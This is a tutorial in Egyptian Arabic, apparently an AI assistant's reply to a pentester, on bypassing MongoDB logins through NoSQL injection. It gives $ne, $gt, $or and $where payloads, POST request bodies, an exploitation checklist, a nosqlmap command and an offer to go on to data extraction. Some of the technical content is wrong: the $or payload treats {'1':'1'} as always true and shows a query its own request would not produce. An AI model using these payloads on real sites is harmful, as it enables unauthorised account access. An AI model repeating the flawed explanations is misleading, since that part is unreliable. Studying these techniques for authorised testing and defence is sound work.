تمام، هنشرح تقنيات تجاوز المصادقة باستخدام **NoSQL Injection** بعمق عملي مع أكواد وتفاصيل، وهنركز على الجوانب اللي تهمك كـ pentester. هقسم الموضوع لأجزاء عن التقنيات المختلفة، وبعد كل جزء هحط خلاصة طريفة بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال. يلا نبدأ!

---

### **1. استخدام العامل `$ne` (غير مساوي)**
#### **إيه هو؟**
في قواعد NoSQL زي MongoDB، العامل `$ne` (Not Equal) بيخليك تتخطى شرط معين في الاستعلام لو المطور معملش فلترة كويسة للمدخلات.

#### **ازاي بيشتغل؟**
بدل ما تدخل قيمة باسوورد صحيحة، بتحط تعبير `$ne` مع قيمة غلط، فالاستعلام بيبقى دايماً صح لأنه بيقارن بـ "مش مساوي" بدل "مساوي".

#### **مثال عملي:**
- الاستعلام الأصلي في الباك إند:
  ```javascript
  db.users.find({ username: "admin", password: "12345" });
  ```
- جرب في حقل الباسوورد:
  ```
  {"$ne": "wrong"}
  ```
  الاستعلام هيبقى:
  ```javascript
  db.users.find({ username: "admin", password: {"$ne": "wrong"} });
  ```
  معناه: "جيب اليوزر admin طالما الباسوورد مش wrong"، يعني أي باسوورد صح هيدخلك.

- **اختبار يدوي:**
  لو الموقع بيستخدم JSON في الطلب:
  ```
  POST /login
  {"username": "admin", "password": {"$ne": "wrong"}}
  ```
  لو دخلت، يبقى نجح.

#### **خلاصة طريفة:**
تخيل إنك بتقول للبواب "أنا أحمد وكلمة السر مش بطيخ"، لو قالك "اتفضل" من غير ما يسألك عن الكلمة الصح، يبقى الباب اتفتح بمزاجك!

---

### **2. استخدام العامل `$gt` أو `$lt` (أكبر من/أقل من)**
#### **إيه هو؟**
العاملين `$gt` (Greater Than) و `$lt` (Less Than) بيسمحولك تتخطى المصادقة باستخدام مقارنات بدل المساواة.

#### **ازاي بيشتغل؟**
بتحط شرط بيقول "الباسوورد أكبر من قيمة فاضية" مثلاً، فالاستعلام بيبقى صح دايماً طالما الباسوورد موجود.

#### **مثال عملي:**
- الاستعلام الأصلي:
  ```javascript
  db.users.find({ username: "admin", password: "12345" });
  ```
- في حقل الباسوورد:
  ```
  {"$gt": ""}
  ```
  الاستعلام هيبقى:
  ```javascript
  db.users.find({ username: "admin", password: {"$gt": ""} });
  ```
  معناه: "جيب اليوزر admin طالما الباسوورد أكبر من فاضي"، يعني أي حاجة هتنفع.

- **اختبار بـ POST:**
  ```
  POST /login
  {"username": "admin", "password": {"$gt": ""}}
  ```
  لو الصفحة دخلتك، يبقى الثغرة شغالة.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "لو كلمة السر أكبر من الصفر، دخلني"، لو دخلت من غير ما تقول الكلمة، يبقى الكنز بتاعك ببلاش!

---

### **3. استخدام `$or` لتجاوز الشرط**
#### **إيه هو؟**
العامل `$or` بيخليك تضيف شرط دايماً صح (True) للاستعلام، فتتخطى المصادقة حتى لو الباسوورد غلط.

#### **ازاي بيشتغل؟**
بتضيف `$or` مع شرط زي `"1": "1"`، فالاستعلام بيبقى دايماً صح بغض النظر عن الباسوورد.

#### **مثال عملي:**
- الاستعلام الأصلي:
  ```javascript
  db.users.find({ username: "admin", password: "12345" });
  ```
- في حقل اليوزر نيم:
  ```
  {"$or": [{"username": "admin"}, {"1": "1"}]}
  ```
  وفي الباسوورد أي حاجة (زي `test`). الاستعلام هيبقى:
  ```javascript
  db.users.find({ "$or": [{"username": "admin"}, {"1": "1"}], password: "test" });
  ```
  الـ `"1": "1"` دايماً صح، فهيدخلك حتى لو الباسوورد غلط.

- **اختبار بـ POST:**
  ```
  POST /login
  {"username": {"$or": [{"username": "admin"}, {"1": "1"}]}, "password": "test"}
  ```

#### **خلاصة طريفة:**
تخيل إنك بتقول للبواب "أنا أحمد أو أنا أي حد عايز يدخل"، لو فتحلك الباب، يبقى هو اللي بيحب يساعدك بمزاجه!

---

### **4. استخدام `$where` لتشغيل JavaScript**
#### **إيه هو؟**
في MongoDB، العامل `$where` بيخليك تشغل كود JavaScript في الاستعلام. لو الموقع بيسمح بده، تقدر تتخطى المصادقة أو تسحب بيانات.

#### **ازاي بيشتغل؟**
بتكتب تعبير JavaScript دايماً بيرجع `true` أو بيستخرج بيانات معينة.

#### **مثال عملي:**
- الاستعلام الأصلي:
  ```javascript
  db.users.find({ username: "admin", password: "12345" });
  ```
- في حقل اليوزر نيم:
  ```
  {"$where": "1 == 1"}
  ```
  الاستعلام هيبقى:
  ```javascript
  db.users.find({ "$where": "1 == 1", password: "whatever" });
  ```
  الـ `1 == 1` دايماً صح، فهيدخلك.

- **سحب بيانات:**
  ```
  {"$where": "this.username == 'admin'"}
  ```
  لو رد الموقع بنجاح، يبقى تقدر تلعب أكتر.

#### **خلاصة طريفة:**
تخيل إنك بتقول للبواب "لو واحد زاي واحد، دخلني"، لو دخلت يبقى البواب بيحب الرياضيات وفتحلك الباب بسهولة!

---

### **خطوات عملية للاستغلال كـ Pentester**
1. **اختبار `$ne`:**
   - في فورم لوجين، حط في الباسوورد:
     ```
     {"$ne": "wrong"}
     ```
     لو دخلت، يبقى الثغرة شغالة.

2. **اختبار `$gt` أو `$lt`:**
   - جرب:
     ```
     {"$gt": ""}
     ```
     أو:
     ```
     {"$lt": "z"}
     ```
     لو نجحت، دوّن الطريقة.

3. **اختبار `$or`:**
   - استخدم:
     ```
     {"$or": [{"username": "admin"}, {"1": "1"}]}
     ```
     في اليوزر نيم، وأي باسوورد، وشوف لو بيدخل.

4. **اختبار `$where`:**
   - جرب:
     ```
     {"$where": "1 == 1"}
     ```
     لو نجح، حاول تستخرج بيانات زي:
     ```
     {"$where": "this.username == 'admin'"}
     ```

5. **استخدام أدوات (NoSQLmap):**
   - شغل:
     ```
     nosqlmap -u "http://example.com/login.php?username=admin&password=test"
     ```
     واختار خيار "Authentication Bypass" لو موجود.

#### **نصيحة:**
- استخدم Burp Suite عشان تعترض الطلب وتحط الـ Payloads دي يدويًا.
- لو الموقع بيرجع أخطاء، دوّنها عشان تعرف نوع الداتابيز (MongoDB مثلاً).

---

ها، عايز أشرح حاجة زيادة زي ازاي تستخرج بيانات بعد التجاوز أو أعمق في NoSQLmap؟